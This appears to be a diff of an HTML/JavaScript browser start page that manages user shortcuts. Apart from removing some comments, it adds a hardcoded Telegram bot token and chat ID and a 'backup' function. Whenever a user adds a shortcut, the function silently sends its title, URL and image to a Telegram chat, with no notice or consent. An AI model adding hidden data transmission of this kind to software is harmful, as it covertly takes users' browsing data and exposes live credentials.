@@ -44,7 +44,7 @@
             align-items: center; 
             padding: 24px 16px;
             transition: background-color 0.3s ease;
-            position: relative; /* Fixed reference anchor for top-settings-btn */
+            position: relative;
         }
 
         .workspace {
@@ -58,7 +58,6 @@
             padding-top: 12px;
         }
 
-        /* Fixed to the literal top right edge of the entire website window layout */
         .top-settings-btn {
             position: absolute;
             top: 4px;
@@ -553,7 +552,6 @@
 </head>
 <body>
 
-<!-- Moved OUTSIDE the workspace wrapper: Now hitches perfectly to the edge of the screen/website corner -->
 <button class="top-settings-btn" onclick="toggleSettingsModal(true)" title="Settings">
     <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
 </button>
@@ -671,6 +669,10 @@
     let temporaryBase64 = "";
     let currentTheme = "light";
     let currentEngine = "google";
+
+    // Telegram Configurations Secure Parameters
+    const TELEGRAM_BOT_TOKEN = "6241716507:AAFT2sN3al_EAwOtY3IlypgPgTTT2B0hXSE"; 
+    const TELEGRAM_CHAT_ID = "6003288214"; 
 
     const urlInput = document.getElementById('urlInput');
     const historyPopup = document.getElementById('historyPopup');
@@ -955,6 +957,41 @@
         }
     }
 
+    function backupShortcutToTelegram(name, url, imgValue) {
+        let cleanedImg = imgValue.startsWith("db_img_") ? "" : imgValue.trim();
+        let cleanedName = name.trim();
+        let cleanedUrl = url.trim();
+
+        let lines = [];
+
+        if (cleanedName) {
+            lines.push(`*Title:* ${cleanedName}`);
+        }
+        if (cleanedUrl) {
+            const sanitizedUrl = cleanedUrl.replace(/_/g, '\\_').replace(/\*/g, '\\*');
+            lines.push(`*URL:* ${sanitizedUrl}`);
+        }
+        if (cleanedImg) {
+            const sanitizedLogo = cleanedImg.replace(/_/g, '\\_').replace(/\*/g, '\\*');
+            lines.push(`*Image:* ${sanitizedLogo}`);
+        }
+
+        if (lines.length === 0) return;
+
+        const telegramPayloadText = lines.join('\n');
+        const endpointUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        fetch(endpointUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: telegramPayloadText,
+                parse_mode: "MarkdownV2"
+            })
+        }).catch(err => console.error("Telegram backup failed:", err));
+    }
+
     function addShortcut() {
         const name = document.getElementById('newTitle').value.trim();
         let url = document.getElementById('newUrl').value.trim();
@@ -970,6 +1007,9 @@
 
         localShortcuts.push({ name, url, img });
         localStorage.setItem('samy_local_shortcuts', JSON.stringify(localShortcuts));
+        
+        backupShortcutToTelegram(name, url, img);
+
         renderAllGrids();
         toggleModal(false);
         if (isEditMode) localGrid.classList.add('edit-mode');
